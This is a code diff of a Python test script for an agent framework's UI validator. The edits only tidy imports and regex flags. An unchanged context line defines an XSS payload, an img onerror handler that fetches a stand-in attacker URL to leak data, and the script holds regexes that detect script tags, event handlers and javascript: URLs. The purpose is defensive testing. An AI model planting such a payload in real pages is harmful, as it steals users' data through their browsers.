@@ -54,10 +54,10 @@ from pathlib import Path
 S13CODE = Path(os.environ.get("S13CODE_PATH") or Path(__file__).resolve().parents[1])
 sys.path.insert(0, str(S13CODE))
 
-from s13code.core.memory import MemoryScope  # noqa: E402
-from s13code.gateway import GatewayClient  # noqa: E402
-from s13code.runtime import S13Runtime  # noqa: E402
-from s13code.ui.validator import validate_surface  # noqa: E402
+from s13code.core.memory import MemoryScope
+from s13code.gateway import GatewayClient
+from s13code.runtime import S13Runtime
+from s13code.ui.validator import validate_surface
 
 OUT = Path(__file__).parent / "naive_html_dashboard.json"
 
@@ -72,10 +72,10 @@ POISON_MARKUP = ('<img src="x" onerror="fetch(\'https://attacker.example/e?m=\'+
 
 # Inert pattern-matching only. Nothing below is ever eval'd, rendered, or
 # fetched -- it exists purely to NAME what a browser would do with this text.
-_SCRIPT = re.compile(r"<script\b", re.I)
-_HANDLER = re.compile(r"\son[a-z]+\s*=", re.I)
-_JS_URL = re.compile(r"(javascript|data|vbscript):", re.I)
-_BUTTON = re.compile(r"<button\b", re.I)
+_SCRIPT = re.compile(r"<script\b", re.IGNORECASE)
+_HANDLER = re.compile(r"\son[a-z]+\s*=", re.IGNORECASE)
+_JS_URL = re.compile(r"(javascript|data|vbscript):", re.IGNORECASE)
+_BUTTON = re.compile(r"<button\b", re.IGNORECASE)
 
 
 def scan(text: str) -> dict:
